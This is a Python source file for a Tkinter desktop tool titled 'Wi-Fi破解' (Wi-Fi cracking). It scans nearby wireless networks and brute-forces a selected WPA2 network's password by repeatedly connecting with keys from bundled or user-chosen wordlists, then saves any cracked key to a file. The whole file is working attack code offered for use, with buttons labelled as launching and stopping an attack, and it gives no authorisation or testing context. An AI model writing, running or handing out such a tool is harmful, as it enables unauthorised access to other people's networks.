#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/4/26 4:23 PM
# @Author  : Steven
# @Contact : 523348709@qq.com
# @Site    : 
# @File    : wifidog.py
# @Software: PyCharm
import ctypes
from tkinter import *
from tkinter.ttk import Treeview
from tkinter.ttk import Progressbar

import pywifi
from pywifi import *
import time
import threading
import tkinter.filedialog
import tkinter.messagebox


class Watchdog():
    def __init__(self):
        self.root = Tk()
        self.root.title('Wi-Fi破解')
        self.root.wm_attributes('-topmost', 1)
        self.root.geometry('820x400+300+200')
        self.root.maxsize(800, 350)
        self.root.minsize(800, 350)
        self.root.iconbitmap('2.ico')
        self.list = []
        self.MODES = [
            ("top10", 'top10.txt', 0),
            ("top20", 'top20.txt', 1),
            ("top100", 'top100.txt', 2),
        ]
        self.filename = './top10.txt'
        self.break_flag = False
        self.ap_list = None
        self.ap_mac = None
        self.createWidgets()

    def createWidgets(self):

        self.frm = Frame(self.root)

        self.prograss = Progressbar(self.frm, mode="determinate", orient=HORIZONTAL)
        self.prograss.grid(row=1, column=1)
        self.prograss["maximum"] = 100
        self.prograss_num = IntVar()
        self.prograss["variable"] = self.prograss_num
        self.prograss.pack(fill=X, padx=5, pady=5)

        self.frm_L = Frame(self.frm)
        self.frm_R = Frame(self.frm)
        self.frm_R.pack(side=RIGHT, fill=X)
        self.frm_L.pack(side=LEFT, fill=X)
        # 表格
        self.tree = Treeview(self.frm_L, columns=['a', 'b', 'c', 'd', 'e'], show='headings', height=20, selectmode=BROWSE)
        # 内容居中
        self.tree.column("a", width=50, anchor="center")
        self.tree.column("b", width=200, anchor="center")
        self.tree.column("c", width=150, anchor="center")
        self.tree.column("d", width=80, anchor="center")
        self.tree.column("e", width=100, anchor="center")

        # 内容标题
        self.tree.heading('a', text='NO.')
        self.tree.heading('b', text='SSID')
        self.tree.heading('c', text='BSSID')
        self.tree.heading('d', text='SIGNAL')
        self.tree.heading('e', text='ENC/AUTH')
        self.tree.bind('<ButtonRelease-1>', self.selectItem)
        self.tree.pack(fill=X, padx=5, pady=10)

        self.loading_val = StringVar()
        self.loading_text = Label(self.frm, textvariable = self.loading_val, padx=10, pady=5, font = '微软雅黑 -15')

        self.scan_button = Button(self.frm_R, text='扫描WiFi', command=self.thread_a)
        self.scan_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)

        self.radio_frm = Frame(self.frm_R)
        self.radio_frm.pack(fill=X, padx=5, pady=5)
        self.radio_val = StringVar()
        self.radio_val.set('top10.txt')
        for text, mode, col in self.MODES:
            b = Radiobutton(self.radio_frm, text=text, command = self.change_file,
                            variable=self.radio_val, value=mode)
            b.grid(column=col, row=0)

        self.stop_scan_button = Button(self.frm_R, text='选择其它文件',command=self.dic_select)
        self.stop_scan_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)

        self.attack_button = Button(self.frm_R, text='破解攻击',command=self.attack_wifi)
        self.attack_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)

        self.stop_button = Button(self.frm_R, text='终止攻击', command=self.break_flag_control)
        self.stop_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)

        self.frm.pack()

    def get_wifi_interface(self):
        # 获取网卡接口
        wifi = PyWiFi()
        if len(wifi.interfaces()) <= 0:
            tkinter.messagebox.showerror('提示', '没有找到wifi网卡')
            exit()
        if len(wifi.interfaces()) == 1:
            # self.message_box('搜索到网卡设备 %s' % (wifi.interfaces()[0].name()))
            iface = wifi.interfaces()[0]
            return iface
        else:
            print ('%-4s   %s' % ('No', 'interface name'))
            for i, w in enumerate(wifi.interfaces()):
                print ('%-4s   %s' % (i, w.name()))
            while True:
                iface_no = input('Please choose interface No:')
                no = int(iface_no)
                if no >= 0 and no < len(wifi.interfaces()):
                    return wifi.interfaces()[no]

    def selectItem(self,event):
        #绑定函数
        item = self.tree.focus()
        self.ap_mac= self.tree.item(item)['values'][2]
        # print (self.ap_mac)

    def dic_select(self):
        self.radio_val.set('1')
        self.filename = ""
        new_filename = tkinter.filedialog.askopenfilename(filetypes=[('TXT', 'txt')])
        if new_filename != '':
            self.filename = new_filename

    def attack_wifi(self,timeout=8):
        if self.break_flag == True:
            tkinter.messagebox.showinfo('提示', '正在攻击，请先终止攻击')
            return
        if self.ap_list == None:
            tkinter.messagebox.showinfo('提示', '未扫描WiFi，无法操作')
            return
        if self.ap_mac == None:
            tkinter.messagebox.showinfo('提示', '请选择要爆破的wifi')
            return
        if self.filename == "":
            tkinter.messagebox.showinfo('提示', '请选择爆破用字典文件')
            return
        # 读取txt
        with open(self.filename, 'r')as f:
            keys = f.readlines()
        target=None
        for k,x in self.ap_list.items():
            if x.bssid==self.ap_mac:
                target=x
                break
        self.break_flag = True
        if target!=None:
            key_index = 0
            profile = pywifi.Profile()
            profile.ssid = target.ssid.strip()
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            while key_index<len(keys) and self.break_flag:
                key = keys[key_index]
                profile.key = key.strip()
                self.prograss_num.set((key_index + 1) * 100 / len(keys))
                # self.iface.remove_all_network_profiles()
                self.iface.disconnect()
                self.iface.connect(self.iface.add_network_profile(profile))
                code = -1
                pre_time = time.time()
                now_time = time.time() - pre_time
                # self.dic_var.set('当前正在尝试密码%s'%key.strip())
                # print(target.ssid)
                while True:
                    self.root.update()
                    time.sleep(0.1)
                    code=self.iface.status()
                    now_time=time.time()-pre_time
                    if code == const.IFACE_DISCONNECTED or now_time>timeout:
                        break
                    # if code == const.IFACE_DISCONNECTED:
                    #     break
                    elif code == const.IFACE_CONNECTED:
                        tkinter.messagebox.showinfo('提示', '密码破解成功，密码为%s'% key)
                        self.break_flag = False
                        f=open(x.ssid, 'w+')
                        f.write(key)
                        f.close()
                        return
                if code == const.IFACE_DISCONNECTED and now_time<1:
                    time.sleep(8)
                    continue
                key_index=key_index+1
                time_former = time.time()
            if self.break_flag:
                tkinter.messagebox.showinfo('提示', '密码破解失败，请尝试其它密码字典')
            else:
                tkinter.messagebox.showinfo('提示', '已经终止破解')
        else:
            tkinter.messagebox.showinfo('提示', '选择的wifi已丢失')
        self.break_flag = False

    def change_file(self):
        rad_file = self.radio_val.get()
        self.filename = './'+rad_file
        print(self.filename)

    def scan_loading(self):
        self.loading_text.place(x=250, y=170)
        self.loading_val.set("Loading.    ")
        text = ["Loading.    ", "Loading..   ", "Loading...  "]
        index = 0
        while self.is_loading:
            time.sleep(0.5)
            self.loading_val.set(text[index%3])
            index = index+1
        self.loading_text.place_forget()
    def scan_wifi(self):
        #清空列表
        items=self.tree.get_children()
        for item in items:
            self.tree.delete(item)

        self.is_loading = True
        t = threading.Thread(target=self.scan_loading)
        t.start()
        self.iface = self.get_wifi_interface()
        self.ap_list = {}
        self.ap_mac = None
        # 还需要扫描次数，此处没有
        self.iface.scan()
        time.sleep(5)
        for i, x in enumerate(self.iface.scan_results()):
            ssid = x.ssid
            if len(ssid) == 0:  # hidden ssid
                #ssid = '<length: 0>'
                continue
            elif ssid == '\\x00':  # hidden ssid
                #ssid = '<length: 1>'
                continue
            else:
                if len(x.akm) > 0:  # if len(x.akm)==0 ,the auth is OPEN
                    self.ap_list[x.bssid] = x
            self.tree.insert('', 'end', values=[i + 1, ssid, x.bssid, x.signal, self.get_akm_name(x.akm)])
        self.is_loading = False

    def get_akm_name(self, akm_value):
        # 获取加密类型
        akm_name_value = {'NONE': 0, 'UNKNOWN': 5, 'WPA': 1, 'WPA2': 3, 'WPA2PSK': 4, 'WPAPSK': 2}
        akm_names = []
        for a in akm_value:
            for k, v in akm_name_value.items():
                if v == a:
                    akm_names.append(k)
                    break
        if len(akm_names) == 0:
            akm_names.append("OPEN")

        return '/'.join(akm_names)

    def thread_a(self):
        # 线程控制
        t = threading.Thread(target=self.scan_wifi)
        t.start()

    def thread_b(self):
        #线程控制
        t = threading.Thread(target=self.attack_wifi)
        t.start()

    def break_flag_control(self):
        self.break_flag=False


if __name__ == '__main__':
    dog = Watchdog()
    mainloop()
